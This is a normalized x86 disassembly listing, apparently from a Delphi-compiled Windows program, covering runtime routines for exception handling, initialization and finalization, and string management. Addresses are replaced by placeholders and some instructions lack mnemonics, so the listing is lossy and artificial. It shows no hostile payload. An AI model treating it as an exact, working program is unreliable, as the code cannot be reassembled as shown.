jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f70
sub_4039e0
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405fd0
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4031ec
call sub_4035c8
sub_403a34
call sub_405fd0
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4031ec
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403690
jmp edx
sub_403a7c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_402870
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403bdc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c4a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403caa
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d04
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405d64
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d28
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405d64
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d50
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d74
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403dd0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e00
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012dc
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012a4
push eax
call sub_4012c4
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012a4
push eax
call sub_4012c4
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e8c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d74
call sub_403e00
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c04
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bdc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405830
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403dd0
push eax
call sub_4012f4
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f7c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_40278c
pop eax
sub_403fa0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_403fd0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404040
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402968
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_404014
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_404040
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_40276c
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40406c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404040
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f7c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402968
sub_40409c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040bc
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_401354
pop ebp
retn 0x4
sub_4040d8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f7c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045c8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40409c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40409c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045c8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40406c
jmp r-xdata
sub_404174
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40406c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041a4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040d8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041ec
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40406c
not ecx
sub_404218
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402968
pop ebx
retn
mov ecx ebx
sub_404244
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fd0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045c8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045c8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402968
pop edi
pop esi
pop ebx
retn
sub_404288
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fd0
test ecx ecx
je sub_403fd0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404244
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404040
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402968
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402968
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fd0
pop edx
pop eax
jmp sub_404244
call sub_403fd0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042fc
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404040
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045c8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402968
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fd0
dec [ edx - 0x8 ]
sub_404388
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404448
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404040
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402968
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_40278c
sub_40449c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f7c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40406c
jmp r-xdata
pop ebx
retn 0x4
sub_4044dc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404448#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402968
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045c8
mov edi ecx
sub_404524
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045c8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402968
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402968
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404580
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045c8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f7c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404040
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027ac
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402968
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404674
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_401394
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404698
test edx edx
je sub_40465c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40465c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
retn
sub_4046bc
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40465c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048a4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040bc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040bc
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048a4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404748
jmp r-xdata
sub_404748
test ecx ecx
je sub_40465c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
pop edx
push [ edx ]
mov [ edx ] eax
call sub_401394
retn
sub_40476c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404748
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047d4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404858
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047c8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404748
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048a4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40464c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404634
mov ebx eax
mov eax [ edi ]
call sub_4047c8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402968
mov eax esi
sub_4048e8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404918
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404918
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404918
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048e8
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_4049b8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a04
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a04
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fa0
jmp r-xdata
call sub_403f7c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404674
jmp r-xdata
call sub_40465c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049ec
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a04
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049b8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4058a0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4051c0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_4028c8
sub_404b14
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402968
mov edx [ eax + esi ]
add eax ebx
call sub_403fd0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404698
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404afc
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402968
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c30
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b14
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4058b8
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4051fc
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_404c30
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403fd0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
